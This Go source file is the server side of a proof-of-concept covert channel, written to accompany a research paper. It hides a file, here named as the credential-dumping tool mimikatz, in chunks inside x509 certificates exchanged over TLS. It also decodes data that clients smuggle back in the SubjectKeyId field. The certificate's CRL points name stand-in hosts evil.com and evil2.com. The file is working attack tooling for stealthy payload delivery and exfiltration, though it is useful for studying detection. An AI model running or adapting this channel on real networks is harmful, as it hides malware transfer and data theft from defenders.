/*
Server code for demonstrating transfering a file over x509 extension covert channel.
Research paper over x509 covert channel: http://vixra.org/abs/1801.0016
Written by: Jason Reaves
ver1 - 2Jan2018

MIT License

Copyright (c) 2018 Jason Reaves

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/
package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"io/ioutil"
	"log"
	"helper"
	"net"
)

type active_client struct {
	ip    string
	index int
}

var currclient active_client

func verifyHook(rawCerts [][]byte, verifiedChains [][]*x509.Certificate) error {
	cert, _ := x509.ParseCertificate(rawCerts[0])
	data := cert.SubjectKeyId
	dec := helper.DecryptData(data)
	fmt.Println("Received from client: ", dec)
	return nil
}

var bsize = 10000

func main() {
	priv, _ := rsa.GenerateKey(rand.Reader, 4096)
	ca, pv := helper.GenCert("EICAR", []byte{}, []string{"http://evil.com/ca1.crl", "http://evil2.com/ca2.crl"}, priv)

	fdata, _ := ioutil.ReadFile("mimikatz.bin")
	sz := len(fdata)
	iterations := sz / bsize
	fmt.Println("Iterations until done: ", iterations)

	for {
		cert, err := tls.X509KeyPair(ca, pv)
		if err != nil {
			log.Fatalf("server: loadkeys: %s", err)
		}
		config := tls.Config{Certificates: []tls.Certificate{cert}}
		config.InsecureSkipVerify = true
		config.VerifyPeerCertificate = verifyHook
		config.ClientAuth = tls.RequireAnyClientCert
		config.Rand = rand.Reader
		service := "0.0.0.0:4433"
		listener, err := tls.Listen("tcp", service, &config)
		if err != nil {
			log.Fatalf("server: listen: %s", err)
		}
		//log.Print("server: listening")
		conn, err := listener.Accept()
		if err != nil {
			log.Printf("server: accept: %s", err)
			break
		}
		defer conn.Close()
		if currclient.ip == "" {
			currclient.ip = conn.RemoteAddr().String()
			currclient.index = 0
		} else {
			blob := []byte("DONE")
			if currclient.index < iterations {
				blob = fdata[currclient.index*bsize : (currclient.index+1)*bsize]
			} else if currclient.index == iterations {
				blob = fdata[currclient.index*bsize : sz]
			} else {
				currclient.index = 0
				currclient.ip = ""
			}
			currclient.index += 1
			ca, pv = helper.GenCertWithFile("EICAR", blob, priv)
		}
		log.Printf("server: accepted from %s", conn.RemoteAddr())
		tlscon, ok := conn.(*tls.Conn)
		if ok {
			log.Print("ok=true")
			state := tlscon.ConnectionState()
			log.Print(state.PeerCertificates)
			for _, v := range state.PeerCertificates {
				log.Print(x509.MarshalPKIXPublicKey(v.PublicKey))
			}
		}
		go handleClient(conn)
		listener.Close()
	}
}

func handleClient(conn net.Conn) {
	defer conn.Close()
	buf := make([]byte, 512)
	for {
		log.Print("server: conn: waiting")
		n, err := conn.Read(buf)
		if err != nil {
			if err != nil {
				log.Printf("server: conn: read: %s", err)
			}
			break
		}
		log.Printf("server: conn: echo %q\n", string(buf[:n]))
		n, err = conn.Write(buf[:n])

		n, err = conn.Write(buf[:n])
		log.Printf("server: conn: wrote %d bytes", n)

		if err != nil {
			log.Printf("server: write: %s", err)
			break
		}
	}
	log.Println("server: conn: closed")
}
